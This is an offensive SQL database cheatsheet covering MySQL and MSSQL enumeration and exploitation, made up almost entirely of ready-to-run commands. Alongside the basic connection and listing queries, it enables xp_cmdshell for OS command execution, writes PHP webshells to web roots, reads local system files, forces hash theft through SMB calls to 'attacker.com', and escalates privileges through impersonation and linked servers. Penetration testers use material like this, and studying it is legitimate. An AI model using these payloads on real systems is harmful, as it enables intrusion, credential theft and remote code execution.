# SQL Enumeration Cheatsheet

Enumerating MySQL (port 3306) and MSSQL (ports 1433, 2433) services.

## 1. Enumerate SQL Service and Version (nmap)
Gather SQL service and version information for MySQL and MSSQL.
```bash
nmap -Pn -sV -sC -p1433,3306,2433 target.com
```
- `-Pn`: Skips host discovery.
- `-sV`: Detects service and version.
- `-sC`: Runs default scripts (e.g., `ms-sql-info`).

## 2. Connect to MySQL (mysql)
Connect to a MySQL server.
```bash
mysql -u user -p'password' -h target.com
```
- `-u user`: Specify username.
- `-p'password'`: Specify password.
- `-h`: Target host.

## 3. Connect to MSSQL (sqlcmd)
Connect to an MSSQL server from Windows.
```bash
sqlcmd -S target.com -U user -P 'password' -y 30 -Y 30
```
- `-S`: Target server.
- `-U user`: Username.
- `-P 'password'`: Password.
- `-y 30 -Y 30`: Adjusts output width.

## 4. Connect to MSSQL from Linux (sqsh)
Connect to MSSQL from Linux.
```bash
sqsh -S target.com -U user -P 'password' -h
```
- `-S`: Target server.
- `-U user`: Username.
- `-P 'password'`: Password.
- `-h`: Disables headers for cleaner output.

## 5. Connect to MSSQL with Windows Auth (sqsh)
Connect to MSSQL using Windows Authentication.
```bash
sqsh -S target.com -U .\\user -P 'password' -h
```
- `-U .\\user`: Username with local host prefix for Windows Auth.

## 6. Connect to MSSQL (mssqlclient.py)
Connect to MSSQL using Impacket's mssqlclient.py.
```bash
mssqlclient.py -p 1433 user@target.com
```
- `-p 1433`: Specify port.
- `user@target.com`: Username and target server.

## 7. Show MySQL Databases
List all available databases in MySQL.
```sql
SHOW DATABASES;
```

## 8. Select MySQL Database
Switch to a specific database in MySQL.
```sql
USE dbname;
```

## 9. Show MySQL Tables
List tables in the selected database in MySQL.
```sql
SHOW TABLES;
```

## 10. Select MySQL Table Data
Retrieve all entries from a table in MySQL.
```sql
SELECT * FROM users;
```

## 11. Show MSSQL Databases
List all available databases in MSSQL.
```sql
SELECT name FROM master.dbo.sysdatabases
GO
```

## 12. Select MSSQL Database
Switch to a specific database in MSSQL.
```sql
USE dbname
GO
```

## 13. Show MSSQL Tables
List tables in the selected database in MSSQL.
```sql
SELECT table_name FROM dbname.INFORMATION_SCHEMA.TABLES
GO
```

## 14. Select MSSQL Table Data
Retrieve all entries from a table in MSSQL.
```sql
SELECT * FROM users
GO
```

## 15. Enable xp_cmdshell in MSSQL
Enable command execution in MSSQL (requires admin privileges).
```sql
EXECUTE sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
EXECUTE sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO
```

## 16. Execute System Command in MSSQL
Run a system command via MSSQL (if xp_cmdshell enabled).
```sql
xp_cmdshell 'whoami'
GO
```

## 17. Write File in MySQL
Create a file (e.g., webshell) using MySQL (requires FILE privilege).
```sql
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

## 18. Check MySQL File Privileges
Verify if secure_file_priv is empty for file operations.
```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

## 19. Read Local Files in MySQL
Read local files in MySQL (requires FILE privilege).
```sql
SELECT LOAD_FILE('/etc/passwd');
```

## 20. Enable Ole Automation Procedures in MSSQL
Enable file writing capabilities in MSSQL (requires admin privileges).
```sql
sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
sp_configure 'Ole Automation Procedures', 1
GO
RECONFIGURE
GO
```

## 21. Create a File in MSSQL
Write a file (e.g., webshell) using MSSQL (if Ole Automation enabled).
```sql
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', NULL, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
GO
```

## 22. Read Local Files in MSSQL
Read local files in MSSQL (requires read access).
```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
GO
```

## 23. Steal MSSQL Service Hash (xp_dirtree)
Force MSSQL to authenticate to a fake SMB share.
```sql
EXEC master..xp_dirtree '\\attacker.com\share\'
GO
```

## 24. Steal MSSQL Service Hash (xp_subdirs)
Force MSSQL to authenticate to a fake SMB share.
```sql
EXEC master..xp_subdirs '\\attacker.com\share\'
GO
```

## 25. Identify Users to Impersonate in MSSQL
List users that can be impersonated in MSSQL.
```sql
SELECT DISTINCT b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO
```

## 26. Check Current User and Role in MSSQL
Verify current user and sysadmin role status in MSSQL.
```sql
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```

## 27. Impersonate a User in MSSQL
Impersonate a user and check privileges in MSSQL.
```sql
EXECUTE AS LOGIN = 'username'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```

## 28. Revert Impersonation in MSSQL
Revert to the original user in MSSQL.
```sql
REVERT
GO
```

## 29. Identify Linked Servers in MSSQL
List linked servers in MSSQL.
```sql
SELECT srvname, isremote FROM sysservers
GO
```

## 30. Query Linked Server in MSSQL
Check user and privileges on a linked server.
```sql
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [linkedserver.com]
GO
```